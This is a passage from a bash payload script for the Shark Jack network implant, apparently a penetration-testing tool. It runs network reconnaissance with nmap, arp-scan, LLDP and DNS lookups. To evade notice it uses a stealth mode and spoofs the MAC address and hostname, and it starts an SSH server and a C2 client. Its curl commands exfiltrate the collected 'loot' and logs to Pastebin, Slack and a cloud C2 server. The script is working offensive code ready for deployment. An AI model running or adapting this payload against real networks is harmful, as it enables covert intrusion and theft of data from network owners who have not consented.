		curl -s -d api_paste_code="$(<$LOG_FILE)" -d api_paste_name="$LOG_FILE_DESC" -d api_paste_expire_date=$PASTEBIN_EXPIRE_DATE -d api_dev_key=$PASTEBIN_API_KEY -d api_user_key=$PASTEBIN_LOGIN_KEY -d api_option=paste -d api_paste_private=2 $PASTEBIN_API_POST_URL && echo "Exfiltration of $LOG_FILE to Pastebin has passed" >> $LOG_FILE || echo "Exfiltration of $LOG_FILE to Pastebin has failed" >> $LOG_FILE
	fi
	return
}

function EXFIL_TO_SLACK() {
	if [ "$EXFIL_TO_SLACK" = "true" ]; then
		LOOT_FILES="$LOOT_DIR/*.txt"
		for LOOT_FILE in $LOOT_FILES; do
			LOOT_FILE_DESC=${LOOT_FILE/"$LOOT_DIR/"/}
			LOOT_FILE_DESC=$SCAN_COUNT-$TODAY-${LOOT_FILE_DESC%.*}-loot
			LOOT_FILE_DESC=${LOOT_FILE_DESC^^}
			curl -s -F title="$LOOT_FILE" -F file="@$LOOT_FILE" -F initial_comment="$LOOT_FILE_DESC" -F channels="$SLACK_CHANNEL_ID" -H "Authorization: Bearer $SLACK_OAUTH_TOKEN" $SLACK_API_UPLOAD_URL > /dev/null && echo "Exfiltration of $LOOT_FILE to Slack has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Slack has failed" >> $LOG_FILE
		done
		LOG_FILE_DESC=$SCAN_COUNT-$TODAY-LOGFILE
		curl -s -F title="$LOG_FILE" -F file="@$LOG_FILE" -F initial_comment="$LOG_FILE_DESC" -F channels="$SLACK_CHANNEL_ID" -H "Authorization: Bearer $SLACK_OAUTH_TOKEN" $SLACK_API_UPLOAD_URL > /dev/null && echo "Exfiltration of $LOG_FILE to Slack has passed" >> $LOG_FILE || echo "Exfiltration of $LOG_FILE to Slack has failed" >> $LOG_FILE
	fi
	return
}

function RECON_COMPLETED_NOTIFICATION() {
	if [ "$NOTIFY_HOMEY" = "true" ]; then
		curl -s -i -X GET $HOMEY_WEBHOOK_URL?tag="SharkJack_recon_completed" > /dev/null && echo "Recon completed message has been sent to Homey" >> $LOG_FILE || echo "Recon completed message has NOT been sent to Homey as something went wrong" >> $LOG_FILE
	fi
	if [ "$NOTIFY_PUSHOVER" = "true" ]; then
		curl -s --form-string token="$PUSHOVER_APPLICATION_TOKEN" --form-string user="$PUSHOVER_USER_TOKEN" --form-string priority="$PUSHOVER_PRIORITY" --form-string device="$PUSHOVER_DEVICE" --form-string title="SharkJack recon completed message" --form-string message="Loot identifier: $SCAN_COUNT-$TODAY, Complete recon scan took $SECONDS seconds" $PUSHOVER_API_POST_URL > /dev/null && echo "Recon completed notification has been sent to Pushover" >> $LOG_FILE || echo "Recon completed notification has NOT been sent to Pushover as something went wrong" >> $LOG_FILE
	fi
	if [ "$NOTIFY_SLACK" = "true" ]; then
		curl -s -X POST -F text="SharkJack recon completed message. Loot identifier: $SCAN_COUNT-$TODAY, Complete recon scan took $SECONDS seconds" -F channel="$SLACK_CHANNEL_ID" -F user="n$SLACK_USER" -F token="$SLACK_OAUTH_TOKEN" $SLACK_API_POST_URL > /dev/null && echo "Recon completed notification has been sent to Slack" >> $LOG_FILE || echo "Recon completed notification has NOT been sent to Slack as something went wrong" >> $LOG_FILE
	fi
	return
}

function BLINK_INTERNAL_IP_ADDRESS() {
	if [ "$BLINK_INTERNAL_IP_ADDRESS" = "true" ]; then
		INTERNAL_IP_FIRST_OCTET=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F. {'print $1'})
		INTERNAL_IP_SECOND_OCTET=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F. {'print $2'})
		INTERNAL_IP_THIRD_OCTET=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F. {'print $3'})
		INTERNAL_IP_LAST_OCTET=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F. {'print $4'})
		LED OFF

		# Uncomment sections in case you want to blink other octets as well

		for i in {1..10}; do
			sleep 4
			
			#for (( i = 0; i < ${#INTERNAL_IP_FIRST_OCTET}; i++ )); do
			#	DIGIT=${INTERNAL_IP_FIRST_OCTET:$i:1}
			#
			#	if [ $DIGIT = "0" ]; then
			#		LED W SOLID; sleep 1
			#		LED OFF; sleep 0.125
			#	else
			#		for (( j = 0; j < $DIGIT; j++ )); do
			#			LED W SOLID; sleep 0.05
			#			LED OFF; sleep 0.125
			#		done
			#	fi
			#	sleep 1
			#done
			
			#sleep 2
			
			#for (( i = 0; i < ${#INTERNAL_IP_SECOND_OCTET}; i++ )); do
			#	DIGIT=${INTERNAL_IP_SECOND_OCTET:$i:1}
			#
			#	if [ $DIGIT = "0" ]; then
			#		LED W SOLID; sleep 1
			#		LED OFF; sleep 0.125
			#	else
			#		for (( j = 0; j < $DIGIT; j++ )); do
			#			LED W SOLID; sleep 0.05
			#			LED OFF; sleep 0.125
			#		done
			#	fi
			#	sleep 1
			#done
			
			#sleep 2
			
			#for (( i = 0; i < ${#INTERNAL_IP_THIRD_OCTET}; i++ )); do
			#	DIGIT=${INTERNAL_IP_THIRD_OCTET:$i:1}
			#
			#	if [ $DIGIT = "0" ]; then
			#		LED W SOLID; sleep 1
			#		LED OFF; sleep 0.125
			#	else
			#		for (( j = 0; j < $DIGIT; j++ )); do
			#			LED W SOLID; sleep 0.05
			#			LED OFF; sleep 0.125
			#		done
			#	fi
			#	sleep 1
			#done
			
			#sleep 2
			
			for (( i = 0; i < ${#INTERNAL_IP_LAST_OCTET}; i++ )); do
				DIGIT=${INTERNAL_IP_LAST_OCTET:$i:1}

				if [ $DIGIT = "0" ]; then
					LED C SOLID; sleep 1
					LED OFF; sleep 0.125
				else
					for (( j = 0; j < $DIGIT; j++ )); do
						LED C SOLID; sleep 0.05
						LED OFF; sleep 0.125
					done
				fi
				sleep 1
			done
			
			sleep 2
		done
		echo "IP address has been send via light pattern on SharkJack" >> $LOG_FILE
	fi
	return
}

# ****************************************************************************************************
# Execute payload
# ****************************************************************************************************

# Setup
if [ "$STEALTH_MODE" = "true" ]; then
	LED OFF
else
	LED SETUP
fi
CREATE_SCAN_FOLDER					# Checks loot folder with highest index number in loot root folder and creates the next loot folder for current scan
INITIALIZE_LOG_FILE					# Initialize the log file
SET_NETMODE						# Set NETMODE to DHCP_CLIENT (for SharkJack v1.1.0+)
CHANGE_HOSTNAME
CHANGE_MAC_ADDRESS					# Change MAC address, note: changing the MAC address will also force a new IP address to be provided
LOOKUP_SUBNET
COPY_BACK_DHCP_RETRIEVED_DNS_SERVERS			# Copy back auto discovered DNS and Domain information
USE_CUSTOM_DNS_SERVER
START_SSH_SERVER					# Start Secure SHell server
CHECK_DEFAULT_GATEWAY
CHECK_INTERNET_ACCESS					# Check Internet access by pinging public host
GET_EXTERNAL_IP_ADDRESS					# Get external (public) IP address by using public web service
RECON_STARTED_NOTIFICATION
START_CLOUD_C2_CLIENT

# Attack
if [ ! "$STEALTH_MODE" = "true" ]; then
	LED ATTACK
fi
GRAB_IFCONFIG_LOOT
GRAB_TRACEROUTE_LOOT
GRAB_DNS_INFORMATION_LOOT
GRAB_PUBLIC_IP_WHOIS_LOOT
GRAB_LLDP_LOOT						# Link Layer Discovery Protocol, lookup neighbors and interfaces
GRAP_ARP_SCAN_LOOT
GRAB_NMAP_LOOT
GRAB_NMAP_INTERESTING_HOSTS_LOOT
GRAB_DIG_LOOT

# Finish
if [ ! "$STEALTH_MODE" = "true" ]; then
	LED STAGE2
fi
echo "Free diskspace after actions: $(df -h | grep overlayfs | awk {'print $4'})" >> $LOG_FILE
echo "Recon script took $SECONDS seconds" >> $LOG_FILE
EXFIL_TO_CLOUD_C2
EXFIL_TO_PASTEBIN
EXFIL_TO_SLACK
RECON_COMPLETED_NOTIFICATION
sync							# Sync filesystem in order to prevent data loss 

# ****************************************************************************************************
# Prevent logging after this line!
# ****************************************************************************************************

if [ ! "$STEALTH_MODE" = "true" ]; then
	BLINK_INTERNAL_IP_ADDRESS
	LED FINISH
fi
if [ "$HALT_SYSTEM_WHEN_DONE" = "true" ]; then
	halt
fi
